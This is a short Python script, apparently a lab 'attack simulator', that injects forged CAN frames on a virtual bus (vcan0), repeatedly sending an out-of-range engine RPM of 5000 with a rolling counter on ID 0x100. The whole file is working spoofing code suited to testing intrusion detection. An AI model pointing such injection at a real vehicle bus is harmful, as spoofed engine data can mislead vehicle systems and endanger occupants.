import can
import time

CAN_ID = 0x100

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)

print("=" * 60)
print(" INVALID ENGINE RPM ATTACK SIMULATOR")
print("=" * 60)
print()
print("Target CAN ID : 0x100")
print("Fake RPM      : 5000")
print("Maximum RPM   : 3000")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()

counter = 0

try:
    while True:

        rpm = 5000

        rpm_data = rpm.to_bytes(
            2,
            byteorder="big"
        )

        counter_data = bytes([counter])

        message = can.Message(
            arbitration_id=CAN_ID,
            data=rpm_data + counter_data,
            is_extended_id=False
        )

        bus.send(message)

        print(
            f"ATTACK -> RPM={rpm} | "
            f"Counter={counter}"
        )

        counter = (counter + 1) % 256

        time.sleep(1)

except KeyboardInterrupt:

    print()
    print("Invalid RPM attack stopped.")

finally:

    bus.shutdown()
